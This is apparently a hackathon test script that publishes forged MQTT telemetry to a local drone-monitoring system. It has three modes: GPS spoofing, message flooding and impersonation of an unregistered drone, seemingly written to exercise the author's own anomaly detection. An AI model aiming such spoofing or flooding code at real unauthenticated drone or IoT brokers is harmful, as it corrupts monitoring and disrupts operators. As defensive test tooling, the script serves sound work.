import json
import time
import paho.mqtt.client as mqtt

# Connect the same way your drone does
attacker = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
attacker.connect("localhost", 1883, 60)  # match whatever drone.py uses

def gps_spoof(drone_id="drone-1"):
    """Pretends to be a real drone but reports an impossible location jump"""
    fake_message = {
        "drone_id": drone_id,
        "lat": 89.9999,     # far away from where the real drone is
        "lon": 179.9999,
        "battery": 87,
        "timestamp": time.time()
    }
    topic = f"devjams_gayathri_drones/{drone_id}/telemetry"
    attacker.publish(topic, json.dumps(fake_message))
    print(f"🚨 Sent fake GPS-spoofed message for {drone_id}: {fake_message}")

def flood_attack(drone_id="drone-1", count=50):
    """Sends a burst of fake messages very fast to overwhelm the system"""
    print(f"🚨 Starting flood attack on {drone_id}...")
    for i in range(count):
        fake_message = {
            "drone_id": drone_id,
            "lat": 28.6139,
            "lon": 77.2090,
            "battery": 50,
            "timestamp": time.time()
        }
        topic = f"devjams_gayathri_drones/{drone_id}/telemetry"
        attacker.publish(topic, json.dumps(fake_message))
    print(f"🚨 Flood attack finished — sent {count} messages instantly")

def impersonation_attack(fake_id="drone-99"):
    """Pretends to be a drone that was never registered/started"""
    fake_message = {
        "drone_id": fake_id,
        "lat": 28.6139,
        "lon": 77.2090,
        "battery": 100,
        "timestamp": time.time()
    }
    topic = f"devjams_gayathri_drones/{fake_id}/telemetry"
    attacker.publish(topic, json.dumps(fake_message))
    print(f"🚨 Sent impersonation attack as fake drone: {fake_id}")


if __name__ == "__main__":
    import sys
    attack_type = sys.argv[1] if len(sys.argv) > 1 else "gps"

    if attack_type == "gps":
        gps_spoof("drone-1")
    elif attack_type == "flood":
        flood_attack("drone-1")
    elif attack_type == "impersonation":
        impersonation_attack("drone-99")
    else:
        print(f"Unknown attack type: {attack_type}")